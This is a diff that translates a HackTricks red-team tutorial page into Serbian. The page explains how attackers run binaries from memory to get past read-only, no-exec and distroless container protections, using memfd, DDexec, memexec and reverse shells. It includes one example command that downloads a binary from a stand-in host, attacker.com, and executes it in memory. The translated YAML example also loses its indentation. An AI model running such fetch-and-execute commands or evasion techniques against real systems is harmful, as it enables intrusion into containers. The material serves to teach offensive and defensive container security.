@@ -1,87 +1,85 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# Zaobilaženje zaštite fajl sistema: samo čitanje / bez izvršavanja / Distroless
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
-## Videos
+## Video snimci
 
-In the following videos you can find the techniques mentioned in this page explained more in depth:
+U sledećim video snimcima možete pronaći tehnike koje su pomenute na ovoj stranici objašnjene detaljnije:
 
-* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
-* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
+* [**DEF CON 31 - Istraživanje manipulacije memorijom Linux-a za prikrivanje i izbegavanje**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**Prikriveni upadi sa DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
-## read-only / no-exec scenario
+## Scenario samo čitanje / bez izvršavanja
 
-It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
+Sve je češće da se na Linux mašinama koristi **zaštita fajl sistema samo za čitanje (ro)**, posebno u kontejnerima. To je zato što je pokretanje kontejnera sa fajl sistemom samo za čitanje jednostavno kao postavljanje **`readOnlyRootFilesystem: true`** u `securitycontext`:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine-pod
+name: alpine-pod
 spec:
-  containers:
-  - name: alpine
-    image: alpine
-    securityContext:
+containers:
+- name: alpine
+image: alpine
+securityContext:
 <strong>      readOnlyRootFilesystem: true
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
+Međutim, čak i ako je fajl sistem montiran kao samo za čitanje, **`/dev/shm`** će i dalje biti upisiv, tako da nije tačno da ne možemo ništa pisati na disk. Međutim, ovaj folder će biti **montiran sa zaštitom bez izvršavanja**, pa ako ovde preuzmete binarni fajl, **nećete moći da ga izvršite**.
 
 {% hint style="warning" %}
-From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
+Sa perspektive crvenog tima, ovo otežava **preuzimanje i izvršavanje** binarnih fajlova koji nisu već prisutni u sistemu (kao što su zadnja vrata ili enumeratori kao što je `kubectl`).
 {% endhint %}
 
-## Easiest bypass: Scripts
+## Najlakše zaobilaženje: Skripte
 
-Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
+Primetite da sam pominjao binarne fajlove, možete **izvršiti bilo koju skriptu** sve dok je interpreter prisutan na mašini, kao što je **shell skripta** ako je `sh` prisutan ili **python** **skripta** ako je instaliran `python`.
 
-However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
+Međutim, ovo nije dovoljno da biste izvršili svoj binarni zadnji ulaz ili druge binarne alate koje možda trebate pokrenuti.
 
-## Memory Bypasses
+## Zaobilaženje memorije
 
-If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
+Ako želite da izvršite binarni fajl, ali fajl sistem to ne dozvoljava, najbolji način da to uradite je **izvršavanje iz memorije**, jer se **zaštite ne primenjuju tamo**.
 
-### FD + exec syscall bypass
+### Zaobilaženje FD + exec syscall
 
-If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
+Ako imate neke moćne skriptne mašine na mašini, kao što su **Python**, **Perl** ili **Ruby**, možete preuzeti binarni fajl za izvršavanje iz memorije, sačuvati ga u deskriptoru fajla u memoriji (`create_memfd` syscall), koji neće biti zaštićen tim zaštitama, a zatim pozvati **`exec` syscall** navodeći **fd kao fajl za izvršavanje**.
 
-For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
+Za ovo možete lako koristiti projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Možete mu proslediti binarni fajl i on će generisati skriptu na naznačenom jeziku sa **binarnim fajlom kompresovanim i b64 enkodiranim** sa instrukcijama za **dekodiranje i dekompresiju** u **fd** koji je kreiran pozivanjem `create_memfd` syscall-a i pozivom **exec** syscall-a za pokretanje.
 
 {% hint style="warning" %}
-This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
+Ovo ne funkcioniše u drugim skriptnim jezicima poput PHP-a ili Node-a jer nemaju **podrazumevani način za pozivanje sirovih syscalls** iz skripte, pa nije moguće pozvati `create_memfd` da se kreira **memorijski fd** za čuvanje binarnog fajla.
 
-Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
+Osim toga, kreiranje **redovnog fd-a** sa fajlom u `/dev/shm` neće raditi, jer nećete moći da ga pokrenete zbog primene **zaštite bez izvršavanja**.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) je tehnika koja vam omogućava da **modifikujete memoriju vašeg sopstvenog procesa** tako što ćete prebrisati njegov **`/proc/self/mem`**.
 
-Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
+Stoga, **kontrolišući asemblerski kod** koji se izvršava od strane procesa, možete napisati **shellcode** i "mutirati" proces da **izvrši bilo koji proizvoljni kod**.
 
 {% hint style="success" %}
-**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
+**DDexec / EverythingExec** će vam omogućiti da učitate i **izvršite** svoj sopstveni **shellcode** ili **bilo koji binarni fajl** iz **memorije**.
 {% endhint %}
-
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
-For more information about this technique check the Github or:
+Za više informacija o ovoj tehnici pogledajte Github ili:
 
 {% content-ref url="ddexec.md" %}
 [ddexec.md](ddexec.md)
@@ -89,54 +87,54 @@ For more information about this technique check the Github or:
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
+[**Memexec**](https://github.com/arget13/memexec) je prirodni sledeći korak od DDexec-a. To je **DDexec shellcode demonizovan**, tako da svaki put kada želite **pokrenuti drugi binarni fajl** ne morate ponovo pokretati DDexec, već možete samo pokrenuti memexec shellcode putem DDexec tehnike i zatim **komunicirati sa ovim demonom da biste preneli nove binarne fajlove za učitavanje i pokretanje**.
 
-You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Možete pronaći primer kako koristiti **memexec za izvršavanje binarnih fajlova iz PHP reverse shell-a** na [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+Sa sličnim ciljem kao i DDexec, tehnika [**memdlopen**](https://github.com/arget13/memdlopen) omogućava **jednostavniji način učitavanja binarnih fajlova** u memoriju radi kasnijeg izvršavanja. Može čak omogućiti učitavanje binarnih fajlova sa zavisnostima.
 
-## Distroless Bypass
+## Bypassovanje Distroless
 
-### What is distroless
+### Šta je distroless
 
-Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
+Distroless kontejneri sadrže samo **apsolutno neophodne komponente za pokretanje određene aplikacije ili servisa**, kao što su biblioteke i zavisnosti za izvršavanje, ali isključuju veće komponente poput upravljača paketa, shell-a ili sistemskih alata.
 
-The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+Cilj distroless kontejnera je **smanjenje površine napada kontejnera eliminisanjem nepotrebnih komponenti** i smanjenje broja ranjivosti koje mogu biti iskorišćene.
 
 ### Reverse Shell
 
-In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+U distroless kontejneru možda **nećete čak ni pronaći `sh` ili `bash`** da biste dobili običan shell. Takođe nećete pronaći binarne fajlove poput `ls`, `whoami`, `id`... sve što obično pokrećete na sistemu.
 
 {% hint style="warning" %}
-Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
+Stoga, nećete moći dobiti **reverse shell** ili **izlistati** sistem kao što obično radite.
 {% endhint %}
 
-However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
+Međutim, ako je kompromitovani kontejner pokrenut na primer kao flask web, tada je instaliran Python, i stoga možete dobiti **Python reverse shell**. Ako se pokreće node, možete dobiti Node reverse shell, i isto važi za većinu **skriptnih jezika**.
 
 {% hint style="success" %}
-Using the scripting language you could **enumerate the system** using the language capabilities.
+Koristeći skriptni jezik, možete **izlistati sistem** koristeći mogućnosti jezika.
 {% endhint %}
 
-If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+Ako ne postoje **zaštite `read-only/no-exec`**, možete zloupotrebiti svoj reverse shell da **pišete u fajl sistem vaše binarne fajlove** i **izvršavate** ih.
 
 {% hint style="success" %}
-However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+Međutim, u ovakvim kontejnerima ove zaštite obično postoje, ali možete koristiti **prethodne tehnike izvršavanja iz memorije da ih zaobiđete**.
 {% endhint %}
 
-You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Možete pronaći **primere** kako iskoristiti neke RCE ranjivosti da biste dobili **reverse shell-ove skriptnih jezika** i izvršili binarne fajlove iz memorije na [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
